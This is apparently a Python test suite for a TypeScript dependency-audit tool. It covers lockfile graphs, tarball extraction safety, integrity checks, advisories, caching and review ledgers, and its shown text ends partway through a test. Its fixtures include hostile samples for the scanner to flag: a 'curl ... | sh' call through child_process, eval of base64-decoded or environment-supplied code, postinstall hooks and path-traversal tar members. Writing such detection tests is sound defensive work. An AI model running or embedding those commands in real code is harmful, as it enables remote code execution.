"""Hermetic behavioral contracts for the TypeScript dependency workflows."""
import base64
import hashlib
import importlib.util
import io
import json
from pathlib import Path
import subprocess
import sys
import tarfile
import time

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = ROOT / 'plugins/typescript-starter/skills/deps-audit/scripts'
sys.path.insert(0, str(SCRIPTS))


def core():
    import audit_core
    return audit_core


def project(tmp_path, source='export const value = 1;', scripts=None):
    app = tmp_path / 'app'
    app.mkdir()
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'demo': '^1.0.0'}}))
    data = io.BytesIO()
    with tarfile.open(fileobj=data, mode='w:gz') as archive:
        for name, contents in {'package/package.json': json.dumps({'name': 'demo', 'version': '1.0.0', 'scripts': scripts or {}}), 'package/index.js': source}.items():
            raw = contents.encode()
            item = tarfile.TarInfo(name)
            item.size = len(raw)
            archive.addfile(item, io.BytesIO(raw))
    body = data.getvalue()
    sri = 'sha512-' + base64.b64encode(hashlib.sha512(body).digest()).decode()
    lock = {'lockfileVersion': '9.0', 'importers': {'.': {'dependencies': {'demo': {'specifier': '^1.0.0', 'version': '1.0.0'}}}}, 'packages': {'demo@1.0.0': {'resolution': {'integrity': sri}}}, 'snapshots': {'demo@1.0.0': {}}}
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    fixtures = tmp_path / 'fixtures'
    fixtures.mkdir()
    (fixtures / 'demo.tgz').write_bytes(body)
    metadata = {'name': 'demo', 'version': '1.0.0', 'dist': {'integrity': sri, 'tarball': 'https://registry.npmjs.org/demo/-/demo-1.0.0.tgz'}}
    (fixtures / 'metadata.json').write_text(json.dumps(metadata))
    (fixtures / 'advisories.json').write_text(json.dumps({'advisories': {}, 'metadata': {}}))
    index = {'kind': 'synthetic', 'origin': 'local test generation', 'files': {name: hashlib.sha256((fixtures / name).read_bytes()).hexdigest() for name in ('demo.tgz', 'metadata.json', 'advisories.json')}, 'metadata': {'https://registry.npmjs.org/|demo@1.0.0': 'metadata.json'}, 'tarballs': {sri: 'demo.tgz'}, 'advisories': 'advisories.json'}
    (fixtures / 'index.json').write_text(json.dumps(index))
    return app, fixtures, lock


def run(app, fixtures, *args):
    proc = subprocess.run([sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--all', '--fixtures', str(fixtures), '--json', *args], text=True, capture_output=True)
    return proc, json.loads(proc.stdout)


def test_full_fixture_never_approves_real_gate(tmp_path):
    app, fixtures, _ = project(tmp_path)
    proc, report = run(app, fixtures)
    assert proc.returncode == 0, proc.stderr + proc.stdout
    assert report['status'] == 'clean'
    assert report['audit_passed'] is False
    assert report['coverage']['artifacts_scanned'] == 1
    assert len(report['rules']) == 8
    assert not core().gate_check(app)['allowed']


def test_lifecycle_is_data_never_executed(tmp_path):
    marker = tmp_path / 'executed'
    app, fixtures, _ = project(tmp_path, scripts={'postinstall': f'node -e "require(\'fs\').writeFileSync(\'{marker}\',\'bad\')"'})
    proc, report = run(app, fixtures)
    assert proc.returncode == 0
    assert any(x['rule_id'] == 'native:lifecycle-effects' for x in report['findings'])
    assert not marker.exists()


def test_duplicate_lock_key_is_incomplete(tmp_path):
    app, fixtures, _ = project(tmp_path)
    (app / 'pnpm-lock.yaml').write_text('lockfileVersion: "9.0"\nlockfileVersion: "9.0"\n')
    proc, report = run(app, fixtures)
    assert proc.returncode == 3
    assert report['status'] == 'incomplete'
    assert 'duplicate' in ' '.join(report['errors']).lower()


def test_integrity_mismatch_is_incomplete_with_block(tmp_path):
    app, fixtures, lock = project(tmp_path)
    lock['packages']['demo@1.0.0']['resolution']['integrity'] = 'sha512-' + base64.b64encode(b'x' * 64).decode()
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    index = json.loads((fixtures / 'index.json').read_text())
    index['tarballs'][lock['packages']['demo@1.0.0']['resolution']['integrity']] = 'demo.tgz'
    (fixtures / 'index.json').write_text(json.dumps(index))
    proc, report = run(app, fixtures)
    assert proc.returncode == 3
    assert any(f['severity'] == 'BLOCK' and f['rule_id'] == 'native:source-change' for f in report['findings'])


@pytest.mark.parametrize('name,kind,target', [('../escape', 'file', ''), ('/absolute', 'file', ''), ('package/link', 'symlink', '../../escape'), ('package/link', 'hardlink', '../escape'), ('package/dev', 'device', '')])
def test_tar_rejects_unsafe_members(tmp_path, name, kind, target):
    data = io.BytesIO()
    with tarfile.open(fileobj=data, mode='w:gz') as archive:
        item = tarfile.TarInfo(name)
        item.type = {'file': tarfile.REGTYPE, 'symlink': tarfile.SYMTYPE, 'hardlink': tarfile.LNKTYPE, 'device': tarfile.CHRTYPE}[kind]
        item.linkname = target
        archive.addfile(item)
    with pytest.raises(core().AuditError):
        core().safe_extract(data.getvalue(), tmp_path / 'out')


def test_graph_alias_peer_and_multiple_versions(tmp_path):
    app, _, lock = project(tmp_path)
    manifest = {'name': 'app', 'dependencies': {'old': 'npm:@scope/pkg@^1.0.0', 'new': 'npm:@scope/pkg@^2.0.0'}}
    (app / 'package.json').write_text(json.dumps(manifest))
    lock['importers']['.']['dependencies'] = {'old': {'specifier': 'npm:@scope/pkg@^1.0.0', 'version': '@scope/pkg@1.0.0(peer@2.0.0(nested@3.0.0))'}, 'new': {'specifier': 'npm:@scope/pkg@^2.0.0', 'version': '@scope/pkg@2.0.0'}}
    lock['packages'] = {f'@scope/pkg@{v}.0.0': {'resolution': {'integrity': f'sha512-{v}'}} for v in (1, 2)}
    lock['snapshots'] = {'@scope/pkg@1.0.0(peer@2.0.0(nested@3.0.0))': {}, '@scope/pkg@2.0.0': {}}
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    graph = core().resolve_graph(app)
    assert {a['name'] for a in graph['artifacts']} == {'@scope/pkg'}
    assert len(graph['artifacts']) == 2
    assert {o['declaredName'] for o in graph['occurrences']} == {'old', 'new'}
    assert any('nested@3.0.0' in str(o['peers']) for o in graph['occurrences'])


def test_ast_rules_and_benign_json(tmp_path):
    app, fixtures, _ = project(tmp_path, "const value = Buffer.from('Zm9v', 'base64').toString(); eval(value); JSON.parse('{}');")
    proc, report = run(app, fixtures)
    assert proc.returncode == 2, proc.stdout + proc.stderr
    assert any(f['rule_id'] == 'native:decoded-execution' and f['severity'] == 'BLOCK' for f in report['findings'])
    assert not any('JSON.parse' == f['snippet'] for f in report['findings'])


def test_seed_records_observations_only(tmp_path):
    app, _, _ = project(tmp_path)
    proc = subprocess.run([sys.executable, str(SCRIPTS.parent.parent / 'deps-vet/scripts/deps_vet.py'), '--root', str(app), '--seed'], capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    ledger = json.loads((app / 'dependency-vet.json').read_text())
    assert ledger['schemaVersion'] == 1
    assert ledger['audits'][0]['decision'] == 'observed'
    assert ledger['audits'][0]['reviewer']['kind'] == 'agent'
    assert ledger['audits'][0]['criteria'] == ['provenance_baseline']


def refresh_fixture(fixtures, relative, data):
    (fixtures / relative).write_text(json.dumps(data))
    index = json.loads((fixtures / 'index.json').read_text())
    index['files'][relative] = hashlib.sha256((fixtures / relative).read_bytes()).hexdigest()
    (fixtures / 'index.json').write_text(json.dumps(index))


def test_real_lock_capture_preserves_consumer_react_and_local_links():
    graph = core().resolve_graph(SCRIPTS.parent / 'test-assets/starter-lock')
    assert len(graph['artifacts']) == 1146
    assert len(graph['snapshots']) == 1146
    assert len(graph['importers']) == 12
    react = {o['importer']: o['snapshot'] for o in graph['occurrences'] if o['direct'] and o['declaredName'] == 'react'}
    assert react['apps/web'] == 'react@19.0.0'
    assert react['apps/mobile'] == 'react@19.1.0'
    assert any(o.get('autoInstalledPeer') for o in graph['occurrences'])
    assert not any(a['name'].startswith('@starter/') for a in graph['artifacts'])
    assert any(o['workspace'] == 'packages/db' for o in graph['occurrences'])


def test_resolution_only_diff_reuses_artifact_identity(tmp_path):
    app, _, lock = project(tmp_path)
    old = core().resolve_graph(app)
    lock['importers']['.']['dependencies']['demo']['version'] = '1.0.0(peer@2.0.0(nested@1.0.0))'
    lock['snapshots'] = {'demo@1.0.0(peer@2.0.0(nested@1.0.0))': {}}
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    new = core().resolve_graph(app)
    diff = core().graph_diff(old, new)
    assert len(diff['resolution_changed']) == 1
    assert not diff['artifact_changed']
    assert old['artifacts'][0]['id'] == new['artifacts'][0]['id']


@pytest.mark.parametrize('text,rule,severity', [
    ('// \u202e hidden\nconst x=1;', 'native:bidi', 'BLOCK'),
    ('new Function("return 1")();', 'native:dynamic-eval', 'WARN'),
    ('const {execSync: run} = require("node:child_process"); run("curl https://example.invalid/a | sh");', 'native:lifecycle-effects', 'BLOCK'),
    ('const encoded = "' + 'A'*300 + '";', 'native:opaque-payload', 'WARN'),
])
def test_native_positive_families(tmp_path, text, rule, severity):
    app, fixtures, _ = project(tmp_path, text)
    _, report = run(app, fixtures)
    assert any(f['rule_id'] == rule and f['severity'] == severity for f in report['findings'])


def test_benign_language_constructs_have_no_execution_finding(tmp_path):
    app, fixtures, _ = project(tmp_path, 'const record = JSON.parse("{}"); const literal = "eval(code)"; // new Function(data)\nexport const foo = (x) => x + 1;')
    proc, report = run(app, fixtures)
    assert proc.returncode == 0
    assert report['findings'] == []


def test_bad_parse_and_text_limit_are_incomplete(tmp_path):
    app, fixtures, _ = project(tmp_path, 'export const = ;')
    proc, report = run(app, fixtures)
    assert proc.returncode == 3
    assert 'parse' in ' '.join(report['errors']).lower()
    proc, report = run(app, fixtures, '--text-limit', '5')
    assert proc.returncode == 3
    assert 'limit' in ' '.join(report['errors']).lower()


def test_archive_duplicate_truncated_and_limits(tmp_path):
    app, fixtures, _ = project(tmp_path)
    raw = (fixtures / 'demo.tgz').read_bytes()
    with pytest.raises(core().AuditError):
        core().safe_extract(raw[:-7], tmp_path / 'truncated')
    with pytest.raises(core().AuditError):
        core().safe_extract(raw, tmp_path / 'limited', members_limit=1)
    data = io.BytesIO()
    with tarfile.open(fileobj=data, mode='w:gz') as archive:
        for _ in range(2):
            archive.addfile(tarfile.TarInfo('package/duplicate'))
    with pytest.raises(core().UnsafeArtifact, match='duplicate'):
        core().safe_extract(data.getvalue(), tmp_path / 'duplicate')
    assert not (tmp_path / 'duplicate/package/duplicate').exists()


def test_strongest_sri_wins(tmp_path):
    raw = b'content'
    good_sha1 = 'sha1-' + base64.b64encode(hashlib.sha1(raw).digest()).decode()
    bad_sha512 = 'sha512-' + base64.b64encode(b'x'*64).decode()
    with pytest.raises(core().UnsafeArtifact):
        core().verify_sri(raw, good_sha1 + ' ' + bad_sha512)
    assert core().verify_sri(raw, good_sha1) == 'sha1'


def test_advisory_high_blocks_and_sarif_preserves_evidence(tmp_path):
    app, fixtures, _ = project(tmp_path)
    data = {'advisories': {'123': {'module_name': 'demo', 'severity': 'high', 'vulnerable_versions': '<2.0.0', 'patched_versions': '>=2.0.0', 'github_advisory_id': 'GHSA-synthetic-only-0001', 'title': 'Synthetic test advisory'}}}
    refresh_fixture(fixtures, 'advisories.json', data)
    output = tmp_path / 'audit.sarif'
    proc, report = run(app, fixtures, '--sarif', str(output))
    assert proc.returncode == 2
    advisory = next(f for f in report['findings'] if f['rule_id'].startswith('advisory:'))
    assert advisory['severity'] == 'BLOCK'
    converted = json.loads(output.read_text())['runs'][0]['results'][0]
    assert converted['properties'] == advisory
    assert converted['level'] == 'error'
    assert report['advisoryDiff'][0]['status'] == 'not_comparable'


def test_advisory_diff_retains_second_vulnerable_version():
    from analysis import advisory_diff
    before = [{'identifiers': ['GHSA-synthetic-only-0001', 'CVE-SYNTHETIC'], 'name': 'demo', 'version': '1.0.0', 'importers': ['web']}, {'identifiers': ['CVE-SYNTHETIC'], 'name': 'demo', 'version': '1.1.0', 'importers': ['web']}]
    after = [before[1]]
    graph = {'artifacts': [{'id': 'x', 'name': 'demo'}], 'occurrences': [{'artifactId': 'x', 'importer': 'web'}]}
    diff = advisory_diff(before, after, graph, graph)
    assert {d['status'] for d in diff} == {'still_exposed'}
    assert all(d['exposed_versions_new'] == ['1.1.0'] for d in diff)
    assert {d['status'] for d in advisory_diff(before, [], graph, graph)} == {'patched'}
    empty = {'artifacts': [], 'occurrences': []}
    assert {d['status'] for d in advisory_diff(before, [], graph, empty)} == {'removed'}
    assert {d['status'] for d in advisory_diff(before, [], graph, empty, False)} == {'not_comparable'}


def test_quick_never_approves_and_offline_missing_fails(tmp_path):
    app, fixtures, _ = project(tmp_path)
    proc, report = run(app, fixtures, '--quick')
    assert proc.returncode == 0
    assert report['audit_passed'] is False
    assert report['coverage']['artifacts_scanned'] == 0
    proc = subprocess.run([sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--all', '--offline', '--json'], capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert proc.returncode == 3
    assert report['status'] == 'incomplete'
    assert any('offline' in e for e in report['errors'])


def cached_project(tmp_path):
    app, fixtures, _ = project(tmp_path)
    graph = core().resolve_graph(app)
    artifact = graph['artifacts'][0]
    cache = app / '.claude/deps-audit/cache'
    from transport import Fetcher
    fetcher = Fetcher(app)
    metadata = (fixtures / 'metadata.json').read_bytes()
    tarball = (fixtures / 'demo.tgz').read_bytes()
    responses = [metadata, tarball]
    fetcher.request = lambda url, limit: responses.pop(0)
    fetched = fetcher.metadata(artifact)
    fetcher.tarball(artifact, fetched)
    identity = core().digest({'artifacts': [a['id'] for a in graph['artifacts']], 'registries': [a['source'] for a in graph['artifacts']]})
    body = (fixtures / 'advisories.json').read_bytes()
    core().atomic_json(cache / 'advisories' / (identity + '.json'), {'fetchedAt': time.time(), 'sha256': core().digest(body), 'body': base64.b64encode(body).decode()})
    return app


def test_complete_offline_cache_and_gate_invalidation(tmp_path):
    app = cached_project(tmp_path)
    command = [sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--all', '--offline', '--json']
    proc = subprocess.run(command, capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert proc.returncode == 0, proc.stdout
    assert report['audit_passed'] is True
    assert core().gate_check(app, 'strict')['allowed']
    manifest = json.loads((app / 'package.json').read_text())
    manifest['description'] = 'configuration changed'
    (app / 'package.json').write_text(json.dumps(manifest))
    assert not core().gate_check(app, 'strict')['allowed']


def test_cache_partial_and_changed_bytes_are_not_trusted(tmp_path):
    app = cached_project(tmp_path)
    from transport import Fetcher
    artifact = core().resolve_graph(app)['artifacts'][0]
    fetcher = Fetcher(app, offline=True)
    metadata = fetcher.metadata(artifact)
    location = fetcher.cache / 'tarballs' / core().digest(artifact['integrity'])
    (location / 'artifact.tgz').write_bytes(b'tampered')
    with pytest.raises(core().UnsafeArtifact):
        fetcher.tarball(artifact, metadata)
    (location / 'complete.json').unlink()
    with pytest.raises(core().AuditError, match='incomplete'):
        fetcher.tarball(artifact, metadata)


def test_no_diff_and_invalid_base_have_distinct_statuses(tmp_path):
    app, fixtures, _ = project(tmp_path)
    subprocess.run(['git', 'init', '-q', str(app)], check=True)
    subprocess.run(['git', 'add', 'package.json', 'pnpm-lock.yaml'], cwd=app, check=True)
    subprocess.run(['git', '-c', 'user.name=Synthetic Fixture', '-c', 'user.email=fixture@example.invalid', 'commit', '-qm', 'fixture'], cwd=app, check=True)
    command = [sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--fixtures', str(fixtures), '--json']
    proc = subprocess.run(command, capture_output=True, text=True)
    assert json.loads(proc.stdout)['status'] == 'no_changes'
    proc = subprocess.run([*command, '--base', 'does-not-exist'], capture_output=True, text=True)
    assert proc.returncode == 3
    assert json.loads(proc.stdout)['status'] == 'incomplete'


def test_ledger_exact_fingerprint_evidence_stale_and_revocation(tmp_path):
    import ledger
    app, _, _ = project(tmp_path)
    artifact = core().resolve_graph(app)['artifacts'][0]
    evidence = app / '.claude/deps-audit/evidence/review.json'
    core().atomic_json(evidence, {'kind': 'synthetic review test'})
    item = core().finding('dynamic-eval', 'WARN', artifact, 'review me', snippet='eval("1")', evidence={'kind': 'synthetic'})
    entry = {'artifact': ledger.identity(artifact), 'contextHash': artifact.get('contextHash'), 'criteria': ['safe_to_deploy'], 'decision': 'cleared', 'reviewer': {'kind': 'agent', 'id': 'test-agent'}, 'reviewedAt': core().utcnow(), 'reason': 'Synthetic test proves exact matching only.', 'evidence': [{'path': evidence.relative_to(app).as_posix(), 'sha256': core().digest(evidence.read_bytes())}], 'findingFingerprints': [item['fingerprint']], 'findingEvidence': {item['fingerprint']: item['evidenceHash']}}
    ledger.append(app, entry)
    result = ledger.apply(app, [artifact], [item], new_ids={artifact['id']})
    assert item['effectiveDecision'] == 'cleared'
    assert item['severity'] == 'WARN'
    altered = dict(item, evidenceHash='different-evidence')
    ledger.apply(app, [artifact], [altered], new_ids={artifact['id']})
    assert altered['effectiveDecision'] == 'active'
    revocation = dict(entry, decision='revoked', reviewedAt=core().utcnow(), reason='Synthetic revocation')
    revocation.pop('id', None)
    ledger.append(app, revocation)
    result = ledger.apply(app, [artifact], [item], new_ids={artifact['id']})
    assert result['rejected'] == [artifact['id']]
    assert item['effectiveDecision'] == 'active'


def test_ledger_import_pinned_without_transitive_trust(tmp_path):
    import ledger
    app, _, _ = project(tmp_path)
    imported = ledger.empty()
    imported['imports'] = [{'path': 'nonexistent-transitive.json', 'sha256': 'missing', 'attribution': 'not followed'}]
    target = app / '.claude/deps-audit/evidence/import.json'
    core().atomic_json(target, imported)
    local = ledger.empty()
    local['imports'] = [{'path': target.relative_to(app).as_posix(), 'sha256': core().digest(target.read_bytes()), 'attribution': 'synthetic pinned import'}]
    ledger.write(app, local)
    assert ledger.load(app)[1] == []
    target.write_text('{}')
    with pytest.raises(core().AuditError, match='digest mismatch'):
        ledger.load(app)


def test_vet_accept_risk_cannot_invent_authorization():
    import ledger
    value = ledger.empty()
    value['audits'] = [{'artifact': {'name': 'demo', 'version': '1.0.0', 'source': 'https://registry.npmjs.org/', 'integrity': 'sha512-x'}, 'criteria': ['safe_to_deploy'], 'decision': 'accepted_risk', 'reviewer': {'kind': 'agent', 'id': 'codex'}, 'reviewedAt': core().utcnow(), 'reason': 'not authorized', 'evidence': [], 'findingFingerprints': []}]
    with pytest.raises(core().AuditError, match='authorization'):
        ledger.validate(value)


def test_docs_read_verified_types_without_execution(tmp_path):
    app, fixtures, _ = project(tmp_path, 'export const focusedApi = (value) => value;')
    command = [sys.executable, str(SCRIPTS.parent.parent / 'docs-fetcher/scripts/docs_fetcher.py'), 'demo', '--root', str(app), '--fixtures', str(fixtures), '--query', 'focusedApi']
    proc = subprocess.run(command, capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert proc.returncode == 0, proc.stdout
    assert report['version'] == '1.0.0'
    assert any('focusedApi' in d['excerpt'] for d in report['documents'])
    assert Path(report['evidencePath']).exists()


def test_update_dry_run_preserves_manifests_and_workspace_protocol(tmp_path):
    app, fixtures, _ = project(tmp_path)
    (fixtures / 'outdated.json').write_text(json.dumps({'.': {'demo': {'current': '1.0.0', 'wanted': '1.2.0', 'latest': '2.0.0'}}}))
    before = {f.name: f.read_bytes() for f in [app/'package.json', app/'pnpm-lock.yaml']}
    command = [sys.executable, str(SCRIPTS.parent.parent / 'deps-update/scripts/deps_update.py'), '--root', str(app), '--dry-run', '--fixtures', str(fixtures)]
    proc = subprocess.run(command, capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert proc.returncode == 0, proc.stdout
    assert report['inventory'][0]['locked'] == '1.0.0'
    assert report['status'] == 'inventory'
    assert all((app/name).read_bytes() == data for name, data in before.items())


def test_pnpm_audit_wrapper_uses_copy_without_lifecycle(tmp_path, monkeypatch):
    app, _, _ = project(tmp_path, scripts={'postinstall': 'touch should-never-exist'})
    from transport import Fetcher
    import transport
    called = []
    def fake_run(command, **kwargs):
        called.append(command)
        assert command == ['pnpm', 'audit', '--json']
        assert Path(kwargs['cwd']) != app
        assert (Path(kwargs['cwd']) / 'pnpm-lock.yaml').read_bytes() == (app / 'pnpm-lock.yaml').read_bytes()
        assert kwargs['env']['npm_config_ignore_scripts'] == 'true'
        return subprocess.CompletedProcess(command, 0, b'{"advisories": {}, "metadata": {}}', b'')
    monkeypatch.setattr(transport.subprocess, 'run', fake_run)
    monkeypatch.setattr(transport.shutil, 'which', lambda command: '/fake/pnpm')
    Fetcher(app).advisories(core().resolve_graph(app), app, 'new')
    assert called == [['pnpm', 'audit', '--json']]
    assert not (app / 'should-never-exist').exists()


def add_package(app, fixtures, lock, name, version, source='export const stable = 1;', metadata_extra=None):
    data = io.BytesIO()
    with tarfile.open(fileobj=data, mode='w:gz') as archive:
        for path, content in {'package/package.json': json.dumps({'name': name, 'version': version}), 'package/index.js': source}.items():
            encoded = content.encode()
            item = tarfile.TarInfo(path)
            item.size = len(encoded)
            archive.addfile(item, io.BytesIO(encoded))
    body = data.getvalue()
    integrity = 'sha512-' + base64.b64encode(hashlib.sha512(body).digest()).decode()
    stem = hashlib.sha256((name + version + integrity).encode()).hexdigest()[:12]
    (fixtures / (stem + '.tgz')).write_bytes(body)
    meta = {'name': name, 'version': version, 'dist': {'integrity': integrity, 'tarball': 'https://registry.npmjs.org/synthetic.tgz'}, **(metadata_extra or {})}
    (fixtures / (stem + '.json')).write_text(json.dumps(meta))
    index = json.loads((fixtures / 'index.json').read_text())
    index['metadata']['https://registry.npmjs.org/|' + name + '@' + version] = stem + '.json'
    index['tarballs'][integrity] = stem + '.tgz'
    for suffix in ('.json', '.tgz'):
        index['files'][stem + suffix] = hashlib.sha256((fixtures / (stem + suffix)).read_bytes()).hexdigest()
    (fixtures / 'index.json').write_text(json.dumps(index))
    lock['packages'][name + '@' + version] = {'resolution': {'integrity': integrity}}
    lock['snapshots'][name + '@' + version] = {}
    return integrity


def commit_fixture(app):
    subprocess.run(['git', 'init', '-q', str(app)], check=True)
    subprocess.run(['git', 'add', '.'], cwd=app, check=True)
    subprocess.run(['git', '-c', 'user.name=Synthetic Fixture', '-c', 'user.email=fixture@example.invalid', 'commit', '-qm', 'fixture'], cwd=app, check=True)


def test_name_similarity_and_external_source_families(tmp_path):
    app, fixtures, lock = project(tmp_path)
    add_package(app, fixtures, lock, 'recat', '1.0.0')
    lock['packages'].pop('demo@1.0.0')
    lock['snapshots'].pop('demo@1.0.0')
    lock['packages']['recat@1.0.0']['resolution']['tarball'] = 'https://packages.example.invalid/recat.tgz'
    lock['importers']['.']['dependencies'] = {'recat': {'specifier': '^1.0.0', 'version': '1.0.0'}}
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'recat': '^1.0.0'}}))
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    proc, report = run(app, fixtures)
    assert proc.returncode == 0, proc.stdout
    assert any(f['rule_id'] == 'native:name-similarity' and 'react' in f['evidence']['similarNames'] for f in report['findings'])
    assert any(f['rule_id'] == 'native:source-change' and f['severity'] == 'WARN' for f in report['findings'])


def test_publisher_change_uses_version_publisher_evidence(tmp_path):
    app, fixtures, lock = project(tmp_path)
    meta = json.loads((fixtures / 'metadata.json').read_text())
    meta['_npmUser'] = {'name': 'synthetic-old-publisher'}
    refresh_fixture(fixtures, 'metadata.json', meta)
    commit_fixture(app)
    add_package(app, fixtures, lock, 'demo', '2.0.0', metadata_extra={'_npmUser': {'name': 'synthetic-new-publisher'}})
    lock['packages'].pop('demo@1.0.0')
    lock['snapshots'].pop('demo@1.0.0')
    lock['importers']['.']['dependencies']['demo'] = {'specifier': '^2.0.0', 'version': '2.0.0'}
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'demo': '^2.0.0'}}))
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    command = [sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--fixtures', str(fixtures), '--json']
    proc = subprocess.run(command, capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert proc.returncode == 0, proc.stdout
    publisher = next(f for f in report['findings'] if f['rule_id'] == 'native:publisher-change')
    assert publisher['severity'] == 'WARN'
    assert publisher['evidence']['old']['publisher']['name'] == 'synthetic-old-publisher'
    assert publisher['evidence']['new']['publisher']['name'] == 'synthetic-new-publisher'


def test_workspace_catalog_override_and_unknown_schema(tmp_path):
    app, _, lock = project(tmp_path)
    (app / 'pnpm-workspace.yaml').write_text('packages: []\ncatalog:\n  demo: ^1.0.0\n')
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'demo': 'catalog:'}}))
    lock['importers']['.']['dependencies']['demo']['specifier'] = 'catalog:'
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    graph = core().resolve_graph(app)
    assert graph['occurrences'][0]['specifier'] == 'catalog:'
    (app / 'pnpm-workspace.yaml').write_text('packages: []\n')
    with pytest.raises(core().AuditError, match='catalog'):
        core().resolve_graph(app)
    lock['lockfileVersion'] = '99.0'
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    with pytest.raises(core().AuditError, match='unsupported'):
        core().resolve_graph(app)


def test_patch_effective_bytes_are_scanned_and_hashed(tmp_path):
    app, fixtures, lock = project(tmp_path, 'export const value = 1;\n')
    patch = app / 'patches/demo.patch'
    patch.parent.mkdir()
    patch.write_text('diff --git a/index.js b/index.js\n--- a/index.js\n+++ b/index.js\n@@ -1 +1 @@\n-export const value = 1;\n+eval(process.env.CODE);\n')
    lock['patchedDependencies'] = {'demo@1.0.0': {'hash': 'synthetic-lock-hash', 'path': 'patches/demo.patch'}}
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    proc, report = run(app, fixtures)
    assert proc.returncode == 2, proc.stdout
    assert any(f['rule_id'] == 'native:dynamic-eval' and f['severity'] == 'BLOCK' for f in report['findings'])
    artifact = report['artifacts'][0]
    assert artifact['patchHash'] == hashlib.sha256(patch.read_bytes()).hexdigest()
    assert artifact['coverage']['effectiveBytesHash']


def test_local_file_tree_changes_identity_without_version_change(tmp_path):
    app, fixtures, lock = project(tmp_path)
    local = app / 'vendor/demo'
    local.mkdir(parents=True)
    (local / 'package.json').write_text(json.dumps({'name': 'demo', 'version': '1.0.0'}))
    (local / 'index.js').write_text('export const value = 1;')
    lock['packages'] = {'demo@file:vendor/demo': {'resolution': {'directory': 'vendor/demo', 'type': 'directory'}}}
    lock['snapshots'] = {'demo@file:vendor/demo': {}}
    lock['importers']['.']['dependencies']['demo'] = {'specifier': 'file:vendor/demo', 'version': 'file:vendor/demo'}
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'demo': 'file:vendor/demo'}}))
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    before = core().resolve_graph(app)
    first_hashes = core().input_hashes(app)
    (local / 'index.js').write_text('export const value = 2;')
    after = core().resolve_graph(app)
    assert before['artifacts'][0]['id'] != after['artifacts'][0]['id']
    assert core().input_hashes(app) != first_hashes
    proc, report = run(app, fixtures)
    assert proc.returncode == 0, proc.stdout
    assert report['coverage']['artifacts_scanned'] == 1
    assert any(f['rule_id'] == 'native:source-change' for f in report['findings'])


def test_optional_scanner_absence_and_failure_are_distinct(monkeypatch, tmp_path):
    from analysis import external_tools
    import analysis
    monkeypatch.setattr(analysis.shutil, 'which', lambda name: None)
    states = external_tools(tmp_path, ['semgrep'], fixture=True)
    assert states['semgrep']['status'] == 'missing'
    assert states['yara']['status'] == 'unavailable'
    monkeypatch.setattr(analysis.shutil, 'which', lambda name: '/fake/' + name)
    monkeypatch.setattr(analysis.subprocess, 'run', lambda *a, **k: subprocess.CompletedProcess(a[0], 4, '', 'failure'))
    states = external_tools(tmp_path, fixture=True)
    assert states['semgrep']['status'] == 'failed'
    assert states['yara']['status'] == 'failed'
    assert states['osv-scanner']['status'] == 'unavailable'


def test_scanner_portable_runtime_resolves_declared_tooling(tmp_path):
    standalone = tmp_path / 'skill'
    standalone.mkdir()
    for name in ('scan_source.cjs', 'require_tool.cjs'):
        (standalone / name).write_bytes((SCRIPTS / name).read_bytes())
    import os
    env = {**os.environ, 'TS_AUDIT_TOOLING': str(ROOT), 'TS_AUDIT_ROOT': str(tmp_path / 'nonexistent')}
    proc = subprocess.run(['node', str(standalone / 'scan_source.cjs')], input=json.dumps({'files': [{'path': 'demo.ts', 'text': 'eval(process.env.CODE);'}]}), text=True, capture_output=True, env=env)
    assert proc.returncode == 0, proc.stderr
    assert json.loads(proc.stdout)['findings'][0]['severity'] == 'BLOCK'


def test_gate_invalidates_source_cache_bytes_and_age(tmp_path):
    app = cached_project(tmp_path)
    command = [sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--all', '--offline', '--json']
    proc = subprocess.run(command, capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert report['audit_passed'], proc.stdout
    assert core().gate_check(app)['allowed']
    source = report['sources']['advisories:new']
    cache = app / '.claude/deps-audit' / source['cachePath']
    changed = json.loads(cache.read_text())
    changed['body'] = base64.b64encode(b'{"advisories":{"tampered":{}}}').decode()
    core().atomic_json(cache, changed)
    assert not core().gate_check(app)['allowed']
    report['completedAt'] = '2000-01-01T00:00:00Z'
    core().atomic_json(app / '.claude/deps-audit/last-run.json', report)
    assert not core().gate_check(app)['allowed']


def test_stale_review_and_changed_context_do_not_clear(tmp_path):
    import ledger
    app, _, _ = project(tmp_path)
    artifact = core().resolve_graph(app)['artifacts'][0]
    evidence = app / '.claude/deps-audit/evidence/review.json'
    core().atomic_json(evidence, {'synthetic': True})
    item = core().finding('dynamic-eval', 'WARN', artifact, 'synthetic finding')
